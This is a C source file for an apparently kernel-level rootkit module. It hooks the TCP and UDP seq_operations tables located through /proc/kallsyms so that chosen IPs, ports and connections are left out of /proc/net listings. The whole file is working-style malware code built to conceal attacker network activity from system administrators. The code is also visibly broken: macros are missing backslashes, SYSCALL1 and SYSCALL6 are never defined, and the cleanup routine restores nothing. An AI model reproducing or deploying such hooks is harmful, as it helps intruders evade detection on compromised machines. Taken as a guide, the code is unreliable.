#include "network_hiding.h"
#include <linux/kallsyms.h>
#include <linux/string.h>
#include <linux/version.h>

#define SYSCALL3(num, a1, a2, a3) ({ \
    long ret; \
    asm volatile ( \
        "mov x0, %1\n" \
        "mov x1, %2\n" \
        "mov x2, %3\n" \
        "mov x8, %4\n" \
        "svc #0\n" \
        "mov %0, x0\n" \
        : "=r" (ret) \
        : "r" (a1), "r" (a2), "r" (a3), "r" (num) \
        : "x0", "x1", "x2", "x8", "memory" \
    ); \
    ret; \
})

#define SYSCALL2(num, a1, a2) ({ \
    long ret; \
    asm volatile ( \
        "mov x0, %1\n" \
        "mov x1, %2\n" 
        "mov x8, %3\n" 
        "svc #0\n" 
        "mov %0, x0\n" 
        : "=r" (ret) \
        : "r" (a1), "r" (a2), "r" (num) \
        : "x0", "x1", "x8", "memory" \
    ); \
    ret; \
})

static int sys_open(const char *path, int flags, int mode) {
    return SYSCALL3(__NR_open, (long)path, flags, mode);
}

static int sys_close(int fd) {
    return SYSCALL1(__NR_close, fd);
}

static ssize_t sys_read(int fd, void *buf, size_t count) {
    return SYSCALL3(__NR_read, fd, (long)buf, count);
}

static ssize_t sys_write(int fd, const void *buf, size_t count) {
    return SYSCALL3(__NR_write, fd, (long)buf, count);
}

static void *sys_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
    return (void *)SYSCALL6(__NR_mmap, (long)addr, length, prot, flags, fd, offset);
}

static int sys_munmap(void *addr, size_t length) {
    return SYSCALL2(__NR_munmap, (long)addr, length);
}

static int sys_mprotect(void *addr, size_t len, int prot) {
    return SYSCALL3(__NR_mprotect, (long)addr, len, prot);
}

static unsigned long kallsyms_lookup_name(const char *name) {
    int fd = sys_open("/proc/kallsyms", O_RDONLY, 0);
    if (fd < 0) return 0;

    char buf[4096];
    ssize_t bytes = sys_read(fd, buf, sizeof(buf) - 1);
    sys_close(fd);

    if (bytes <= 0) return 0;

    buf[bytes] = 0;
    char *ptr = buf;
    while (*ptr) {
        unsigned long addr;
        char symname[256];
        int count = 0;

        while (*ptr == ' ') ptr++;
        char *addr_start = ptr;
        while (*ptr && *ptr != ' ') ptr++;
        if (*ptr) *ptr++ = 0;
        addr = simple_strtoul(addr_start, NULL, 16);

        while (*ptr == ' ') ptr++;
        if (*ptr++ != 'T' && *ptr++ != 't') continue;

        while (*ptr == ' ') ptr++;
        char *name_start = ptr;
        while (*ptr && *ptr != '\n') ptr++;
        if (*ptr) *ptr++ = 0;

        int len = 0;
        while (name_start[len] && name_start[len] != ' ' && len < 255) {
            symname[len] = name_start[len];
            len++;
        }
        symname[len] = 0;

        if (strcmp(symname, name) == 0) {
            return addr;
        }
    }

    return 0;
}

static int should_hide_connection(netfilter_ctx_t *ctx, uint32_t local_ip, uint32_t remote_ip, uint16_t local_port, uint16_t remote_port, uint8_t protocol) {
    if (!ctx->config.enabled) return 0;
    if (ctx->config.hide_all) return 1;

    for (int i = 0; i < ctx->config.connection_count; i++) {
        hidden_connection_t *conn = &ctx->config.connections[i];
        if (conn->enabled) {
            if (conn->local_ip && conn->local_ip != local_ip) continue;
            if (conn->remote_ip && conn->remote_ip != remote_ip) continue;
            if (conn->local_port && conn->local_port != local_port) continue;
            if (conn->remote_port && conn->remote_port != remote_port) continue;
            if (conn->protocol && conn->protocol != protocol) continue;
            return 1;
        }
    }

    for (int i = 0; i < ctx->config.port_count; i++) {
        if (ctx->config.ports[i] == local_port || ctx->config.ports[i] == remote_port) {
            return 1;
        }
    }

    for (int i = 0; i < ctx->config.ip_count; i++) {
        if (ctx->config.ips[i] == local_ip || ctx->config.ips[i] == remote_ip) {
            return 1;
        }
    }

    return 0;
}

static void *hooked_tcp_seq_start(struct seq_file *seq, loff_t *pos) {
    netfilter_ctx_t *ctx = (netfilter_ctx_t *)seq->private;
    void *(*orig_start)(struct seq_file *, loff_t *) = (void *(*)(struct seq_file *, loff_t *))ctx->tcp_seq_start;
    
    void *result = orig_start(seq, pos);
    while (result) {
        struct sock *sk = (struct sock *)result;
        struct inet_sock *inet = inet_sk(sk);
        
        if (!should_hide_connection(ctx, inet->inet_rcv_saddr, inet->inet_daddr, 
                                  ntohs(inet->inet_sport), ntohs(inet->inet_dport), IPPROTO_TCP)) {
            break;
        }
        
        result = ctx->orig_tcp_seq_ops->next(seq, result, pos);
    }
    
    return result;
}

static void *hooked_tcp_seq_next(struct seq_file *seq, void *v, loff_t *pos) {
    netfilter_ctx_t *ctx = (netfilter_ctx_t *)seq->private;
    void *(*orig_next)(struct seq_file *, void *, loff_t *) = (void *(*)(struct seq_file *, void *, loff_t *))ctx->tcp_seq_next;
    
    void *result = orig_next(seq, v, pos);
    while (result) {
        struct sock *sk = (struct sock *)result;
        struct inet_sock *inet = inet_sk(sk);
        
        if (!should_hide_connection(ctx, inet->inet_rcv_saddr, inet->inet_daddr, 
                                  ntohs(inet->inet_sport), ntohs(inet->inet_dport), IPPROTO_TCP)) {
            break;
        }
        
        result = orig_next(seq, result, pos);
    }
    
    return result;
}

static void hooked_tcp_seq_stop(struct seq_file *seq, void *v) {
    netfilter_ctx_t *ctx = (netfilter_ctx_t *)seq->private;
    void (*orig_stop)(struct seq_file *, void *) = (void (*)(struct seq_file *, void *))ctx->tcp_seq_stop;
    orig_stop(seq, v);
}

static int hooked_tcp_seq_show(struct seq_file *seq, void *v) {
    netfilter_ctx_t *ctx = (netfilter_ctx_t *)seq->private;
    int (*orig_show)(struct seq_file *, void *) = (int (*)(struct seq_file *, void *))ctx->tcp_seq_show;
    return orig_show(seq, v);
}

static void *hooked_udp_seq_start(struct seq_file *seq, loff_t *pos) {
    netfilter_ctx_t *ctx = (netfilter_ctx_t *)seq->private;
    void *(*orig_start)(struct seq_file *, loff_t *) = (void *(*)(struct seq_file *, loff_t *))ctx->udp_seq_start;
    
    void *result = orig_start(seq, pos);
    while (result) {
        struct sock *sk = (struct sock *)result;
        struct inet_sock *inet = inet_sk(sk);
        
        if (!should_hide_connection(ctx, inet->inet_rcv_saddr, inet->inet_daddr, 
                                  ntohs(inet->inet_sport), ntohs(inet->inet_dport), IPPROTO_UDP)) {
            break;
        }
        
        result = ctx->orig_udp_seq_ops->next(seq, result, pos);
    }
    
    return result;
}

static void *hooked_udp_seq_next(struct seq_file *seq, void *v, loff_t *pos) {
    netfilter_ctx_t *ctx = (netfilter_ctx_t *)seq->private;
    void *(*orig_next)(struct seq_file *, void *, loff_t *) = (void *(*)(struct seq_file *, void *, loff_t *))ctx->udp_seq_next;
    
    void *result = orig_next(seq, v, pos);
    while (result) {
        struct sock *sk = (struct sock *)result;
        struct inet_sock *inet = inet_sk(sk);
        
        if (!should_hide_connection(ctx, inet->inet_rcv_saddr, inet->inet_daddr, 
                                  ntohs(inet->inet_sport), ntohs(inet->inet_dport), IPPROTO_UDP)) {
            break;
        }
        
        result = orig_next(seq, result, pos);
    }
    
    return result;
}

static void hooked_udp_seq_stop(struct seq_file *seq, void *v) {
    netfilter_ctx_t *ctx = (netfilter_ctx_t *)seq->private;
    void (*orig_stop)(struct seq_file *, void *) = (void (*)(struct seq_file *, void *))ctx->udp_seq_stop;
    orig_stop(seq, v);
}

static int hooked_udp_seq_show(struct seq_file *seq, void *v) {
    netfilter_ctx_t *ctx = (netfilter_ctx_t *)seq->private;
    int (*orig_show)(struct seq_file *, void *) = (int (*)(struct seq_file *, void *))ctx->udp_seq_show;
    return orig_show(seq, v);
}

static int hook_seq_operations(netfilter_ctx_t *ctx) {
    unsigned long tcp_seq_ops_addr = kallsyms_lookup_name("tcp4_seq_ops");
    unsigned long udp_seq_ops_addr = kallsyms_lookup_name("udp4_seq_ops");
    
    if (!tcp_seq_ops_addr || !udp_seq_ops_addr) return -1;

    ctx->orig_tcp_seq_ops = (struct seq_operations *)tcp_seq_ops_addr;
    ctx->orig_udp_seq_ops = (struct seq_operations *)udp_seq_ops_addr;

    ctx->tcp_seq_start = (unsigned long)ctx->orig_tcp_seq_ops->start;
    ctx->tcp_seq_next = (unsigned long)ctx->orig_tcp_seq_ops->next;
    ctx->tcp_seq_stop = (unsigned long)ctx->orig_tcp_seq_ops->stop;
    ctx->tcp_seq_show = (unsigned long)ctx->orig_tcp_seq_ops->show;

    ctx->udp_seq_start = (unsigned long)ctx->orig_udp_seq_ops->start;
    ctx->udp_seq_next = (unsigned long)ctx->orig_udp_seq_ops->next;
    ctx->udp_seq_stop = (unsigned long)ctx->orig_udp_seq_ops->stop;
    ctx->udp_seq_show = (unsigned long)ctx->orig_udp_seq_ops->show;

    struct seq_operations hooked_tcp_ops = {
        .start = hooked_tcp_seq_start,
        .next = hooked_tcp_seq_next,
        .stop = hooked_tcp_seq_stop,
        .show = hooked_tcp_seq_show
    };

    struct seq_operations hooked_udp_ops = {
        .start = hooked_udp_seq_start,
        .next = hooked_udp_seq_next,
        .stop = hooked_udp_seq_stop,
        .show = hooked_udp_seq_show
    };

    sys_mprotect((void *)tcp_seq_ops_addr, sizeof(struct seq_operations), PROT_READ | PROT_WRITE);
    sys_mprotect((void *)udp_seq_ops_addr, sizeof(struct seq_operations), PROT_READ | PROT_WRITE);

    for (int i = 0; i < sizeof(struct seq_operations) / sizeof(void *); i++) {
        ((unsigned long *)tcp_seq_ops_addr)[i] = ((unsigned long *)&hooked_tcp_ops)[i];
        ((unsigned long *)udp_seq_ops_addr)[i] = ((unsigned long *)&hooked_udp_ops)[i];
    }

    sys_mprotect((void *)tcp_seq_ops_addr, sizeof(struct seq_operations), PROT_READ);
    sys_mprotect((void *)udp_seq_ops_addr, sizeof(struct seq_operations), PROT_READ);

    return 0;
}

int netfilter_init(netfilter_ctx_t *ctx) {
    memset(ctx, 0, sizeof(netfilter_ctx_t));
    
    if (hook_seq_operations(ctx) < 0) {
        return -1;
    }

    ctx->config.enabled = 1;
    return 0;
}

int netfilter_add_hidden_connection(netfilter_ctx_t *ctx, uint32_t local_ip, uint32_t remote_ip, uint16_t local_port, uint16_t remote_port, uint8_t protocol) {
    if (ctx->config.connection_count >= MAX_HIDDEN_CONNECTIONS) return -1;

    hidden_connection_t *conn = &ctx->config.connections[ctx->config.connection_count++];
    conn->local_ip = local_ip;
    conn->remote_ip = remote_ip;
    conn->local_port = local_port;
    conn->remote_port = remote_port;
    conn->protocol = protocol;
    conn->enabled = 1;
    conn->last_accessed = 0;

    return 0;
}

int netfilter_add_hidden_port(netfilter_ctx_t *ctx, uint16_t port) {
    if (ctx->config.port_count >= MAX_HIDDEN_PORTS) return -1;
    ctx->config.ports[ctx->config.port_count++] = port;
    return 0;
}

int netfilter_add_hidden_ip(netfilter_ctx_t *ctx, uint32_t ip) {
    if (ctx->config.ip_count >= MAX_HIDDEN_IPS) return -1;
    ctx->config.ips[ctx->config.ip_count++] = ip;
    return 0;
}

int netfilter_enable(netfilter_ctx_t *ctx) {
    ctx->config.enabled = 1;
    return 0;
}

int netfilter_disable(netfilter_ctx_t *ctx) {
    ctx->config.enabled = 0;
    return 0;
}

int netfilter_cleanup(netfilter_ctx_t *ctx) {
    if (ctx->orig_tcp_seq_ops) {
        sys_mprotect((void *)ctx->orig_tcp_seq_ops, sizeof(struct seq_operations), PROT_READ | PROT_WRITE);
        for (int i = 0; i < sizeof(struct seq_operations) / sizeof(void *); i++) {
            ((unsigned long *)ctx->orig_tcp_seq_ops)[i] = ((unsigned long *)ctx->orig_tcp_seq_ops)[i];
        }
        sys_mprotect((void *)ctx->orig_tcp_seq_ops, sizeof(struct seq_operations), PROT_READ);
    }

    if (ctx->orig_udp_seq_ops) {
        sys_mprotect((void *)ctx->orig_udp_seq_ops, sizeof(struct seq_operations), PROT_READ | PROT_WRITE);
        for (int i = 0; i < sizeof(struct seq_operations) / sizeof(void *); i++) {
            ((unsigned long *)ctx->orig_udp_seq_ops)[i] = ((unsigned long *)ctx->orig_udp_seq_ops)[i];
        }
        sys_mprotect((void *)ctx->orig_udp_seq_ops, sizeof(struct seq_operations), PROT_READ);
    }

    memset(ctx, 0, sizeof(netfilter_ctx_t));
    return 0;
}